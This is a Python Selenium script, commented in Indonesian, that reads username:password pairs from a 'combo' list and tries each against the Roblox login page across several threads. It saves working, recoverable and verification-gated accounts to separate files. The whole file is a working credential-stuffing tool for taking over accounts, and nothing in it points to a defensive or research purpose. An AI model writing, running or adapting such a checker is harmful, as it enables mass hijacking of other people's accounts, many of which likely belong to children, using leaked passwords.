import os
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import NoSuchElementException
from colorama import Fore

# Warna
magenta = Fore.MAGENTA
red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
reset = Fore.RESET

# Baca combo
try:
    with open("combo.txt", "r") as file:
        combos = [line.strip() for line in file if ":" in line]
except FileNotFoundError:
    print(f"{red}[!] combo.txt tidak ditemukan.{reset}")
    exit()

# Fungsi untuk cek akun
def check_account(combo):
    username, password = combo.split(":", 1)

    # Setup Chrome options per thread
    options = webdriver.ChromeOptions()
    options.add_argument("--window-size=1280,720")
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36")

    # Start WebDriver
    try:
        service = Service("chromedriver.exe")
        driver = webdriver.Chrome(service=service, options=options)

        driver.get("https://www.roblox.com/Login")
        sleep(2)

        # Klik tombol cookie (jika ada)
        try:
            cookieBtn = driver.find_element(By.XPATH, "//*[contains(text(), 'Accept All')]")
            cookieBtn.click()
        except NoSuchElementException:
            pass

        # Isi form login
        driver.find_element(By.NAME, "username").send_keys(username)
        driver.find_element(By.NAME, "password").send_keys(password)
        driver.find_element(By.ID, "login-button").click()
        sleep(4)

        # Cek hasil login
        page_source = driver.page_source

        if "We've detected suspicious activity on your account" in page_source:
            print(f"[!] {yellow}RECOVER: {combo}{reset}")
            with open("recover.txt", "a") as f:
                f.write(combo + "\n")
        elif "login-form-error" in page_source:
            print(f"[!] {red}BAD: {combo}{reset}")
        elif "Verification" in page_source:
            print(f"[!] {yellow}VERIFICATION: {combo}{reset}")
            with open("verif.txt", "a") as f:
                f.write(combo + "\n")
            sleep(30)
        else:
            print(f"[!] {green}GOOD: {combo}{reset}")
            with open("good.txt", "a") as f:
                f.write(combo + "\n")

    except Exception as e:
        print(f"{red}[!] Error on {combo}: {e}{reset}")
    finally:
        try:
            driver.quit()
        except:
            pass

# 🔁 Jalankan multithread dengan batas aman
if __name__ == "__main__":
    max_threads = 3  # Sesuaikan dengan kapasitas PC kamu
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        executor.map(check_account, combos)
